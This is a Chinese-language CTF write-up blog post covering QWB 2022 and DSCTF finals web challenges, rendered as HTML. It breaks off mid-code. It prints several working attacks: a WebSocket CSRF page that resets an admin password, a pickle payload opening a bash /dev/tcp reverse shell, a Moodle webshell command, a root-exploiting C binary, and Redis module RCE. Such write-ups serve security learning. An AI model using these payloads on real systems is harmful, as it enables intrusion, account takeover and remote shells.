@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="记录生活  Webbabyweb12345678910&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;&lt;script&gt;function ws_attack()&amp;#123;    var ws &#x3D; new WebSocket(&quot;ws:&#x2F;&#x2F;127.0.0.1:8888&#x2F;bot&quot;);    ws.onopen &#x3D; function(evt)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NS - QWB 2022">
+<meta property="og:url" content="http://w1mps.github.io/2022/08/01/QWB2022/index.html">
+<meta property="og:site_name" content="Trashbox 4 outx!">
+<meta property="og:description" content="记录生活  Webbabyweb12345678910&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;&lt;script&gt;function ws_attack()&amp;#123;    var ws &#x3D; new WebSocket(&quot;ws:&#x2F;&#x2F;127.0.0.1:8888&#x2F;bot&quot;);    ws.onopen &#x3D; function(evt)">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202020183.(null)">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202119570.(null)">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202145649.(null)">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202145919.(null)">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202227511.(null)">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202339023.(null)">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202339156.(null)">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202339310.(null)">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202500286.(null)">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202500489.(null)">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202500699.(null)">
+<meta property="article:published_time" content="2022-08-01T02:39:40.000Z">
+<meta property="article:modified_time" content="2022-08-01T12:25:39.060Z">
+<meta property="article:author" content="outx">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>NS - QWB 2022</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/paper/">Paper</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2022/07/25/Supporting%20the%20Detection%20of%20Software%20Supply%20Chain%20Attacks%20through%20Unsupervised%20Signature%20Generation/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://w1mps.github.io/2022/08/01/QWB2022/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://w1mps.github.io/2022/08/01/QWB2022/&text=NS - QWB 2022"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://w1mps.github.io/2022/08/01/QWB2022/&title=NS - QWB 2022"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://w1mps.github.io/2022/08/01/QWB2022/&is_video=false&description=NS - QWB 2022"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NS - QWB 2022&body=Check out this article: http://w1mps.github.io/2022/08/01/QWB2022/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://w1mps.github.io/2022/08/01/QWB2022/&title=NS - QWB 2022"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://w1mps.github.io/2022/08/01/QWB2022/&title=NS - QWB 2022"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://w1mps.github.io/2022/08/01/QWB2022/&title=NS - QWB 2022"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://w1mps.github.io/2022/08/01/QWB2022/&title=NS - QWB 2022"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://w1mps.github.io/2022/08/01/QWB2022/&name=NS - QWB 2022&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://w1mps.github.io/2022/08/01/QWB2022/&t=NS - QWB 2022"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#babyweb"><span class="toc-number">1.1.</span> <span class="toc-text">babyweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crash"><span class="toc-number">1.2.</span> <span class="toc-text">crash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easylogin"><span class="toc-number">1.3.</span> <span class="toc-text">easylogin</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B"><span class="toc-number">2.</span> <span class="toc-text">强网先锋</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DSCTF%E5%86%B3%E8%B5%9B"><span class="toc-number">3.</span> <span class="toc-text">DSCTF决赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#safe-script-new"><span class="toc-number">3.1.</span> <span class="toc-text">safe_script_new</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-java-new"><span class="toc-number">3.2.</span> <span class="toc-text">ez_java_new</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        NS - QWB 2022
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">outx</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-01T02:39:40.000Z" itemprop="datePublished">2022-08-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Notes/">Notes</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Web/" rel="tag">Web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>记录生活</p>
+</blockquote>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="keyword">function</span> <span class="title">ws_attack</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://127.0.0.1:8888/bot&quot;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    ws.onopen = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123; </span></span></span><br><span class="line"><span class="javascript"><span class="xml">        ws.send(<span class="string">&quot;changepw 123456&quot;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">ws_attack();</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>存为exp.html放在服务器上，让bot访问exp.html，修改admin密码为123456</p>
+<p>登录到admin，抓买东西的包</p>
+<p><a target="_blank" rel="noopener" href="https://bishopfox.com/blog/json-interoperability-vulnerabilities">https://bishopfox.com/blog/json-interoperability-vulnerabilities</a></p>
+<p>新增一个num键为负数，让flask解析第二个重复的键，jsonparser解析第一个键</p>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)" alt="img"></p>
+<p>将钱改到最大值之后，随便买点东西</p>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202020183.(null)" alt="img"></p>
+<h2 id="crash"><a href="#crash" class="headerlink" title="crash"></a>crash</h2><p>给了源码，留意到pickle序列化和反序列化操作</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># import sqlite3</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response,request, session</span><br><span class="line"><span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__,static_url_path=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">app.secret_key=random.randbytes(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, username,password</span>):</span></span><br><span class="line">        self.username=username</span><br><span class="line">        self.token=<span class="built_in">hash</span>(password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_password</span>(<span class="params">username</span>):</span></span><br><span class="line">    <span class="keyword">if</span> username==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> admin.secret</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># conn=sqlite3.connect(&quot;user.db&quot;)</span></span><br><span class="line">        <span class="comment"># cursor=conn.cursor()</span></span><br><span class="line">        <span class="comment"># cursor.execute(f&quot;select password from usertable where username=&#x27;&#123;username&#125;&#x27;&quot;)</span></span><br><span class="line">        <span class="comment"># data=cursor.fetchall()[0]</span></span><br><span class="line">        <span class="comment"># if data:</span></span><br><span class="line">        <span class="comment">#     return data[0] </span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     return None</span></span><br><span class="line">        <span class="keyword">return</span> session.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/balancer&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    pickle_data=base64.b64decode(request.cookies.get(<span class="string">&quot;userdata&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> pickle_data <span class="keyword">or</span> <span class="string">b&quot;secret&quot;</span> <span class="keyword">in</span> pickle_data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You damm hacker!&quot;</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -rf *py*&quot;</span>)</span><br><span class="line">    userdata=pickle.loads(pickle_data)</span><br><span class="line">    <span class="keyword">if</span> userdata.token!=<span class="built_in">hash</span>(get_password(userdata.username)):</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;Login First&quot;</span></span><br><span class="line">    <span class="keyword">if</span> userdata.username==<span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome admin, here is your next challenge!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;You&#x27;re not admin!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    resp = make_response(<span class="string">&quot;success&quot;</span>) </span><br><span class="line">    session[<span class="string">&quot;password&quot;</span>]=request.values.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">&quot;userdata&quot;</span>, base64.b64encode(pickle.dumps(User(request.values.get(<span class="string">&quot;username&quot;</span>),request.values.get(<span class="string">&quot;password&quot;</span>)),<span class="number">2</span>)), max_age=<span class="number">3600</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;source.txt&#x27;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>构造pickle反序列化上线shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/exp&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def exp():</span><br><span class="line">    payload=b&#x27;(cos\nsystem\nX\x36\x00\x00\x00bash -c &quot;bash -i &gt;&amp; /dev/tcp/xx.xxx.xxx.xxx/8888 0&gt;&amp;1&quot;o.&#x27;</span><br><span class="line">    return base64.b64encode(payload)</span><br></pre></td></tr></table></figure>
+
+<p>上线后一度怀疑自己思路想提权但是没有能利用的方式，然后突然想起来似乎是上线后一直502，看起来他自己python服务崩了，504是后端超时，502是后端崩掉了，写个flask替换掉本来的后端服务，nginx是一直在的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, static_url_path=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    import time</span><br><span class="line">    time.sleep(300)</span><br><span class="line">    return &quot;&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure>
+
+<p>但是环境没有curl、wget这些好用的命令，将代码base64编码一下利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ZnJvbSBmbGFzayBpbXBvcnQgRmxhc2sKCgphcHAgPSBGbGFzayhfX25hbWVfXywgc3RhdGljX3VybF9wYXRoPScnKQoKQGFwcC5yb3V0ZSgnLycsIG1ldGhvZHM9WydHRVQnLCAnUE9TVCddKQpkZWYgaW5kZXgoKToKICAgIGltcG9ydCB0aW1lCiAgICB0aW1lLnNsZWVwKDMwMCkKICAgIHJldHVybiAiIgoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIGFwcC5ydW4oaG9zdD0nMC4wLjAuMCcsIHBvcnQ9NTAwMCk= |base64 -d &gt; app.py</span><br></pre></td></tr></table></figure>
+
+<p>顺利启动后，用burp访问一下，安心等待即可</p>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202119570.(null)" alt="img"></p>
+<h2 id="easylogin"><a href="#easylogin" class="headerlink" title="easylogin"></a>easylogin</h2><ol>
+<li>首先发起重置admin(sql注入可知用户名)密码请求，接着利用wp的SQL注入获取重置密码链接的token</li>
+</ol>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202145649.(null)" alt="img"></p>
+<ol>
+<li><p>拿着token重置密码登陆moodle后台，利用<a target="_blank" rel="noopener" href="https://github.com/HoangKien1020/Moodle_RCE">https://github.com/HoangKien1020/Moodle_RCE</a> Getshell</p>
+</li>
+<li><p>/blocks/rce/lang/en/block_rce.php?cmd=find / -type f |xargs grep &quot;flag{&quot; &gt; ./11.txt搜索flag</p>
+</li>
+</ol>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202145919.(null)" alt="img"></p>
+<h1 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h1><ol>
+<li><p>文件扫描到<a target="_blank" rel="noopener" href="http://www.zip获取到源码/">www.zip获取到源码</a></p>
+</li>
+<li><p>上传inc文件，利用spl_autoload_register进行文件包含</p>
+</li>
+<li><p>构造反序列化，拿flag</p>
+</li>
+</ol>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202227511.(null)" alt="img"></p>
+<h1 id="DSCTF决赛"><a href="#DSCTF决赛" class="headerlink" title="DSCTF决赛"></a>DSCTF决赛</h1><blockquote>
+<p>懒得重开一个文档了，记录在这里</p>
+</blockquote>
+<h2 id="safe-script-new"><a href="#safe-script-new" class="headerlink" title="safe_script_new"></a>safe_script_new</h2><ol>
+<li>阅读源码，利用php://filter写个马进去</li>
+</ol>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202339023.(null)" alt="img"></p>
+<ol>
+<li>/flag权限只有root可读，翻找suid无果，ps发现有root运行的程序，该程序其他用户可读，就读一下</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">def get_version(program):</span><br><span class="line">    pid = program[1]</span><br><span class="line">    try:</span><br><span class="line">        exe_path = &quot;/proc/&quot; + pid + &quot;/exe&quot;</span><br><span class="line">        program_path = subprocess.check_output([&quot;su&quot;,&quot;-l&quot;,program[0],&quot;-s&quot;,&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,f&quot;readlink &#123;exe_path&#125;&quot;], timeout=1).decode(&#x27;utf-8&#x27;).strip()</span><br><span class="line">        print(program, &quot;/proc/&quot; + pid + &quot;/exe&quot;, program_path)</span><br><span class="line">        return subprocess.check_output([program_path, &#x27;--version&#x27;], timeout=1).decode(&#x27;utf-8&#x27;).strip()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        return None</span><br><span class="line">def get_process_list():</span><br><span class="line">    try:</span><br><span class="line">        process_list = []</span><br><span class="line">        raw = subprocess.check_output([&#x27;ps&#x27;, &#x27;-ef&#x27;]).decode(&#x27;utf-8&#x27;).strip()</span><br><span class="line">        # raw = open(&quot;a.txt&quot;, &quot;r&quot;).read()</span><br><span class="line">        lines =  raw.split(&#x27;\n&#x27;)</span><br><span class="line">        for line in lines:</span><br><span class="line">            if line.startswith(&#x27;UID&#x27;):</span><br><span class="line">                continue</span><br><span class="line">            data = re.findall(r&#x27;^([^\x20]+)\x20+([^\x20]+)\x20+([^\x20]+)\x20+([^\x20]+)\x20+([^\x20]+)\x20+([^\x20]+)\x20+([^\x20]+)\x20+(.+?)$&#x27;, line)</span><br><span class="line">            if len(data) &gt; 0:</span><br><span class="line">                data = data[0]</span><br><span class="line">            else:</span><br><span class="line">                continue</span><br><span class="line">            print(data, data[-1])</span><br><span class="line">            if &quot;java&quot; in data[-1]:</span><br><span class="line">                process_list.append(data)</span><br><span class="line">        return process_list</span><br><span class="line">    except subprocess.CalledProcessError:</span><br><span class="line">        return None</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            processes = get_process_list()</span><br><span class="line">            for process in processes:</span><br><span class="line">                get_version(process)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        time.sleep(20)</span><br></pre></td></tr></table></figure>
+
+<p>简单来说逻辑就是ps -ef获取所有进程信息，然后判断执行命令里有没有java关键字，有就加入get_version列表中get_version会根据进程信息利用readlink获取当前进程exe原本的执行文件，然后执行该文件加--version参数。</p>
+<ol>
+<li>写个c++编译一下，完成后软连接为/var/www/html/java，这时候（注意需要反弹一个shell回来）alias起个别名，alias的优先级是高于$PATH的，但是低于hash，不过似乎这里没有考察这个知识点。值得注意的是，需要使用sleep让该程序挂起等待root起的脚本过来运行。细节如下图</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;cstdlib&gt;</span><br><span class="line">#include &lt;unistd.h&gt; </span><br><span class="line">  int main()</span><br><span class="line">  &#123;  </span><br><span class="line">    system(&quot;cat /flag &gt; /var/www/html/111.txt&quot;);</span><br><span class="line">    sleep(300);</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202339156.(null)" alt="img"></p>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202339310.(null)" alt="img"></p>
+<h2 id="ez-java-new"><a href="#ez-java-new" class="headerlink" title="ez_java_new"></a>ez_java_new</h2><blockquote>
+<p>不想写了嫖一下r3鸽鸽的</p>
+</blockquote>
+<p>redis主从攻击</p>
+<p>访问/actuator/heapdump拿到heapdump，用Mat打开，OQL查询</p>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202500286.(null)" alt="img"></p>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202500489.(null)" alt="img"></p>
+<p>拿到redis.password</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
+<p>make，拿到一个恶意so</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 